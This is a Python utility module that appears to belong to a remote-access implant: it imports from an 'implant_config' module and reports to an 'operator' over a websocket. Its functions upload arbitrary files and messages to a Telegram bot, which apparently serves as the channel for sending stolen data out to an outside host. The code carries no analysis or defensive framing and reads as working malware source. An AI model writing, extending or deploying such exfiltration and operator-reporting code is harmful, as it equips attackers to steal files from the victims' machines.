# --- Файл: utils.py (ЭТАЛОННАЯ ВЕРСЯ) ---
import requests, os, asyncio
import settings
from implant_config import TEMP_PATH

def get_secret(encrypted_secret): return encrypted_secret

def send_telegram_message(text):
    bot_token = get_secret(settings.ENC_TELEGRAM_BOT_TOKEN); chat_id = get_secret(settings.ENC_TELEGRAM_CHAT_ID)
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"; payload = {"chat_id": chat_id, "text": text}
    try: requests.post(url, json=payload, timeout=10); return True
    except requests.RequestException: return False

def send_telegram_document(file_path, caption=""):
    bot_token = get_secret(settings.ENC_TELEGRAM_BOT_TOKEN); chat_id = get_secret(settings.ENC_TELEGRAM_CHAT_ID)
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    try:
        with open(file_path, "rb") as f:
            files = {"document": f}; data = {"chat_id": chat_id, "caption": caption}
            response = requests.post(url, files=files, data=data, timeout=30)
            return response.json().get("ok", False)
    except (requests.RequestException, FileNotFoundError): return False

def send_status_to_operator(ws, loop, message, is_error=False):
    if not loop or loop.is_closed(): return
    payload = {'type': 'status', 'data': f"❌ {message}" if is_error else f"✅ {message}"}
    async def send_message():
        if not ws.closed:
            try: await ws.send_json(payload)
            except (ConnectionResetError, asyncio.CancelledError): pass
    asyncio.run_coroutine_threadsafe(send_message(), loop)